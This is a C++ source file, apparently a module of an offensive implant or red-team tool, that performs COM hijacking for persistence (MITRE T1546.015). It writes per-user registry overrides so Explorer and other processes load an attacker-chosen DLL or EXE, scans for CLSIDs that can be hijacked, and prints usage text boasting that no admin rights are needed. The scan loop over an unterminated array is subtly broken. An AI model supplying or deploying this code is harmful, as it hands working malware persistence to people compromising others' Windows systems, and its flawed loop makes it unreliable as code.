#include "COMHijack.h"

static bool RegWrite(HKEY root, const std::string& path,
                     const std::string& val, const std::string& data) {
    HKEY hk;
    if (RegCreateKeyExA(root, path.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, NULL, &hk, NULL) != ERROR_SUCCESS) return false;
    bool ok = RegSetValueExA(hk, val.empty()?NULL:val.c_str(), 0, REG_SZ,
                              (LPBYTE)data.c_str(), (DWORD)data.size()+1) == ERROR_SUCCESS;
    RegCloseKey(hk);
    return ok;
}

std::string COMHijack::Install(const char* clsid, const char* dllPath) {
    std::string key = S("Software\\Classes\\CLSID\\") + clsid + S("\\InprocServer32");
    bool ok1 = RegWrite(HKEY_CURRENT_USER, key, "", dllPath);
    bool ok2 = RegWrite(HKEY_CURRENT_USER, key, S("ThreadingModel"), S("Apartment"));
    if (!ok1) return "COMHijack: RegWrite failed for " + std::string(clsid);
    return "COMHijack: installed\n"
           "  CLSID:    " + std::string(clsid) + "\n"
           "  DLL:      " + std::string(dllPath) + "\n"
           "  Key:      HKCU\\" + key + "\n"
           "  ThreadingModel: Apartment\n"
           "Any process CoCreating this CLSID will now load our DLL.\n"
           "Detection: HKCU CLSID key creation = Sysmon EID 13 (reg set value).\n"
           "MITRE T1546.015";
}

std::string COMHijack::InstallExe(const char* clsid, const char* exePath) {
    std::string key = S("Software\\Classes\\CLSID\\") + clsid + S("\\LocalServer32");
    bool ok = RegWrite(HKEY_CURRENT_USER, key, "", exePath);
    if (!ok) return "COMHijack: RegWrite failed";
    return "COMHijack: LocalServer32 installed\n"
           "  CLSID: " + std::string(clsid) + "\n"
           "  EXE:   " + std::string(exePath) + "\n"
           "COM out-of-process activation will spawn our EXE instead of the system handler.";
}

std::string COMHijack::Remove(const char* clsid) {
    std::string key = S("Software\\Classes\\CLSID\\") + clsid;
    RegDeleteTreeA(HKEY_CURRENT_USER, key.c_str());
    return "COMHijack: removed HKCU\\Software\\Classes\\CLSID\\" + std::string(clsid);
}

std::string COMHijack::List() {
    std::string r = "COMHijack: HKCU CLSID overrides:\n";
    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\CLSID",
                      0, KEY_ENUMERATE_SUB_KEYS, &hk) != ERROR_SUCCESS)
        return r + "  (none or key not found)\n";
    int count = 0;
    char name[256];
    for (DWORD idx = 0; ; idx++) {
        DWORD len = sizeof(name);
        if (RegEnumKeyExA(hk, idx, name, &len, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
        // Check InprocServer32
        std::string sub = std::string(name) + S("\\InprocServer32");
        HKEY hSub;
        if (RegOpenKeyExA(hk, sub.c_str(), 0, KEY_READ, &hSub) == ERROR_SUCCESS) {
            char val[MAX_PATH] = {};
            DWORD vsz = sizeof(val), vtype;
            RegQueryValueExA(hSub, NULL, NULL, &vtype, (LPBYTE)val, &vsz);
            RegCloseKey(hSub);
            r += "  {" + std::string(name) + "} → " + std::string(val) + "\n";
            count++;
        }
    }
    RegCloseKey(hk);
    if (count == 0) r += "  (none installed)\n";
    return r;
}

std::string COMHijack::FindVulnerable(int maxResults) {
    // Well-known hijackable CLSIDs — verified loaded by Explorer or scheduled tasks
    static const char* candidates[] = {
        "{BCDE0395-E52F-467C-8E3D-C4579291692E}", // MsRdpClient — Explorer
        "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}", // ShellWindows — Explorer
        "{D63B10C5-BB46-4990-A94F-E40B9D520160}", // .NET runtime host
        "{603D3801-BD81-11D0-A3A5-00C04FD706EC}", // Shell Browser (Explorer)
        "{7849596A-48EA-486E-8937-A2A3009F31A9}", // System Restore (periodic)
        "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}", // CLocationManager
        "{4590F811-1D3A-11D0-891F-00AA004B2E24}", // WMI (periodic)
        "{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}", // BITS (periodic)
    };
    std::string r = "COMHijack: vulnerable CLSIDs (in HKLM, not in HKCU):\n";
    int found = 0;
    for (int i = 0; candidates[i] && found < maxResults; i++) {
        // Check HKCU — if already there, not hijackable
        std::string hkcuPath = S("Software\\Classes\\CLSID\\") + candidates[i];
        HKEY hk;
        bool hkcuExists = (RegOpenKeyExA(HKEY_CURRENT_USER, hkcuPath.c_str(),
                                          0, KEY_READ, &hk) == ERROR_SUCCESS);
        if (hkcuExists) RegCloseKey(hk);

        // Check HKLM — must exist for hijack to work
        std::string hklmPath = S("SOFTWARE\\Classes\\CLSID\\") + candidates[i];
        bool hklmExists = (RegOpenKeyExA(HKEY_LOCAL_MACHINE, hklmPath.c_str(),
                                          0, KEY_READ, &hk) == ERROR_SUCCESS);
        if (hklmExists) RegCloseKey(hk);

        if (hklmExists && !hkcuExists) {
            r += "  " + std::string(candidates[i]) + "  [HIJACKABLE]\n";
            found++;
        }
    }
    if (found == 0) r += "  (none found — all may already be in HKCU)\n";
    r += "\nUse: comhijack install {CLSID} <path_to_dll>\n"
         "MITRE T1546.015 — no admin required, fires on COM activation.";
    return r;
}
